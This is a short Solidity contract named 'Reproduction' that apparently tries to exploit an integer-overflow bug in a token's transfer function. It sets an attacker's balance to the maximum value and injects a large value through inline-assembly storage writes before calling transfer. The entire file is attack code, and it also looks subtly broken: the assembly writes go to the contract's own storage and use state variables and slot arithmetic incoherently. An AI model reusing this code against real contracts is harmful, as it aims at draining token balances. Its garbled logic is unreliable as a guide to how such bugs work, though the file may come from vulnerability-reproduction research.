interface IIntegerOverflowAdd {
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
}

contract Reproduction {
    IIntegerOverflowAdd public vulnerable;
    address public target;
    address public attacker;

    constructor(address _vulnerable) {
        vulnerable = IIntegerOverflowAdd(_vulnerable);
        attacker = msg.sender;
    }

    function setupTarget(address _target) public {
        target = _target;
    }

    function injectOverflow() public {
        bytes32 largeValue = bytes32(uint256(type(uint256).max - 0xad09 + 1));
        assembly {
            sstore(add(keccak256(add(mload(0x40), 0x20), 0x20), target), largeValue)
        }
    }

    function setAttackerBalance() public {
        bytes32 balanceSlot = keccak256(abi.encodePacked(attacker, uint256(0)));
        assembly {
            sstore(balanceSlot, not(0))
        }
    }

    function trigger() public {
        vulnerable.transfer(target, 21277);
    }
}